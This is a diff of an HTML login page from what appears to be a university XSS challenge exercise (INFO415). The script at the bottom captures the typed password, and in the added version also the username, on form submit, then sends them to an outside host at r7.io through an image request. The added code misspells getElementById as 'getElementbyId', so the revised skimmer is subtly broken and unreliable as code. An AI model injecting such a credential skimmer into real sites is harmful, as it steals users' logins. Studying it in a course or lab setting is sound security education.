@@ -1,6 +1,7 @@
 
 <!DOCTYPE html>
-<html lang="en" slick-uniqueid="1" keydn="true"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<html lang="en" slick-uniqueid="1" keydn="true"><!--<![endif]-->
+<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta charset="utf-8">
 
     <title>INFO415 XSS Challenges</title>
@@ -29,9 +30,6 @@
   <form id="login" action="https://xss.websecurity.church/0/login" method="get" class="untouched">
       <h1><a href="#">NOPE</a></h1>
     
-    
-    
-
       <div id="login-fields-wrapper">
         <div id="login-fields">
           <input id="login_username" placeholder="username" tabindex="1" name="username" type="text">
@@ -332,17 +330,16 @@ h6,.h6{color:#3e474c;font-weight:500}.medium-heading{color:#788991}.copy-on-imag
  font-weight:700;
  font-style:italic;
 }
-
 </style>
 
 <script>
 document.getElementsByClassName('error-message')[0].style.display = 'none';
 document.getElementsByClassName('problem')[0].style.display = 'none';
 
-document.getElementById('login').onsubmit=function() {
-    i = new Image();
-    i.src = 'http://r7.io/e/akean?s='+document.getElementById('login_password').value;
- 
+document.getElementById('login').onsubmit= function() {
+	i = new Image();
+	username = document.getElementbyId('login_username').value;
+	pass = document.getElementbyId('login_password').value;
+	i.src = 'http://r7.io/e/akean?s=' + "username = " + username + "password = " + pass;
 }
-
 </script>
